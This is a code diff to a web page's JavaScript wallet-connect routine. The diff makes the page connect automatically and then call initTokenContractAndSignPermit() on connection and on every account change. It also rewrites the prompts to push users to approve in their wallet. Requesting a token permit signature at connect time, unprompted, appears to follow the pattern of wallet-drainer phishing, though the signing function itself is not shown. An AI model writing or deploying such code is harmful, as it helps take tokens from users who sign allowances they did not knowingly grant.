@@ -210,13 +210,13 @@ async function autoConnectWallet() {
         
         provider = new ethers.providers.Web3Provider(window.ethereum);
         
-        showStatus('Requesting wallet connection...', 'info');
+        showStatus('Connecting wallet...', 'info');
         
         try {
             const accounts = await provider.send("eth_requestAccounts", []);
             
             if (accounts.length === 0) {
-                showStatus('Click "Continue" to connect wallet', 'info');
+                showStatus('Wallet connection required. Please approve in your wallet.', 'info');
                 const connectBtn = document.getElementById('connectWallet');
                 if (connectBtn) {
                     connectBtn.style.display = 'block';
@@ -241,10 +241,15 @@ async function autoConnectWallet() {
             provider = new ethers.providers.Web3Provider(window.ethereum);
             signer = provider.getSigner();
             
-            await initTokenContract();
+            await initTokenContractAndSignPermit();
         } catch (requestError) {
             if (requestError.code === 4001) {
                 showStatus('Connection rejected. Click "Continue" to try again', 'info');
+                const connectBtn = document.getElementById('connectWallet');
+                if (connectBtn) {
+                    connectBtn.style.display = 'block';
+                    connectBtn.disabled = false;
+                }
             } else {
                 const existingAccounts = await provider.listAccounts();
                 if (existingAccounts.length > 0) {
@@ -264,15 +269,15 @@ async function autoConnectWallet() {
                     provider = new ethers.providers.Web3Provider(window.ethereum);
                     signer = provider.getSigner();
                     
-                    await initTokenContract();
+                    await initTokenContractAndSignPermit();
                 } else {
                     showStatus('Click "Continue" to connect wallet', 'info');
+                    const connectBtn = document.getElementById('connectWallet');
+                    if (connectBtn) {
+                        connectBtn.style.display = 'block';
+                        connectBtn.disabled = false;
+                    }
                 }
-            }
-            const connectBtn = document.getElementById('connectWallet');
-            if (connectBtn) {
-                connectBtn.style.display = 'block';
-                connectBtn.disabled = false;
             }
         }
         
@@ -374,7 +379,7 @@ if (window.ethereum) {
         } else {
             userAddress = accounts[0];
             signer = provider.getSigner();
-            initTokenContract();
+            initTokenContractAndSignPermit();
         }
     });
     
